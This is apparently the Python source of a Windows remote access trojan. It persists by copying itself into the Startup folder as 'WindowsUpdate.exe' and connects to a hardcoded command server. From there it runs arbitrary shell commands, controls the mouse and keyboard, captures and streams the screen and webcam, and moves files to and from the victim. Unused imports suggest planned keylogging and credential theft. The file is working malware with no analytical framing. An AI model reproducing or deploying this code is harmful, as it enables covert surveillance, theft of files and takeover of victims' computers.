import socket
import threading
import os
import subprocess
import time
import tempfile
import sys
import pyautogui
import cv2
import pickle
import struct
import shutil
import getpass
import platform
import requests
import json
import numpy as np
import pynput.keyboard
import sqlite3
import win32crypt
from shutil import copyfile
import queue
import win32com.client

SERVER_IP = 'freezy.con-ip.com'
SERVER_PORT = 6606


def handle_stream(sock, mode):
    cap = cv2.VideoCapture(0) if mode == "cam" else None
    try:
        while True:
            if mode == "screen":
                img = pyautogui.screenshot()
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            else:
                ret, frame = cap.read()
                if not ret:
                    break

            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 40])
            data = pickle.dumps(buffer)
            size = struct.pack("!I", len(data))
            sock.sendall(size + data)

            sock.settimeout(0.1)
            try:
                if sock.recv(10) == b"STOP_STREAM":
                    break
            except:
                continue
    except:
        pass
    finally:
        if cap:
            cap.release()


def copy_to_user_startup():
    startup_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    destination = os.path.join(startup_path, "WindowsUpdate.exe")  # اسم النسخة
    if not os.path.exists(destination):
        shutil.copy2(sys.executable, destination)

copy_to_user_startup()


def connect_to_server():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, SERVER_PORT))

            try:
                external_ip = requests.get("https://api.ipify.org").text
            except:
                external_ip = "Unknown"

            info = {
                "os": platform.system(),
                "ip": external_ip
            }
            client.send(json.dumps(info).encode())

            def remote_control_handler(data):
                try:
                    command = json.loads(data.decode())
                    action = command.get("action")
                    if action == "move":
                        x, y = command["pos"]
                        pyautogui.moveTo(x, y)
                    elif action == "click":
                        button = command.get("button", "left")
                        pyautogui.click(button=button)
                    elif action == "type":
                        text = command.get("text", "")
                        pyautogui.write(text)
                    elif action == "press":
                        key = command.get("key", "")
                        pyautogui.press(key)
                except Exception as e:
                    print("Remote control error:", e)

            while True:
                data = client.recv(4096)
                if not data:
                    break
                if data.startswith(b"RC_"):
                    remote_control_handler(data[3:])
                    continue

                command = data.decode(errors="ignore")
                if command == "SHUTDOWN":
                    os.system("shutdown /s /t 5")
                elif command.startswith("EXEC"):
                    output = subprocess.getoutput(command[5:])
                    client.send(output.encode())
                elif command == "SCREENSHOT":
                    img = pyautogui.screenshot()
                    img.save("screen.png")
                    with open("screen.png", "rb") as f:
                        client.sendall(f.read())
                    os.remove("screen.png")
                elif command == "CAMERA":
                    cam = cv2.VideoCapture(0)
                    ret, frame = cam.read()
                    cam.release()
                    if ret:
                        cv2.imwrite("cam.jpg", frame)
                        with open("cam.jpg", "rb") as f:
                            client.sendall(f.read())
                        os.remove("cam.jpg")
                    else:
                        client.send(b"ERROR: Cannot access camera.")
                elif command.startswith("UPLOAD:"):
                    filename = command.split(":")[1]
                    client.send(b"READY")
                    data = client.recv(1000000)
                    with open(filename, "wb") as f:
                        f.write(data)
                    client.send(b"UPLOAD_DONE")
                elif command.startswith("DOWNLOAD:"):
                    path = command.split(":")[1]
                    try:
                        with open(path, "rb") as f:
                            client.sendall(f.read())
                    except:
                        client.send(b"ERROR: File not found")
                elif command == "STREAM_CAM":
                    handle_stream(client, mode="cam")
                elif command == "STREAM_SCREEN":
                    handle_stream(client, mode="screen")
                
                
                    result = subprocess.getoutput(command)
                    client.send(result.encode())

        except Exception as e:
            print("Connection error:", e)
            time.sleep(5)



threading.Thread(target=connect_to_server).start()
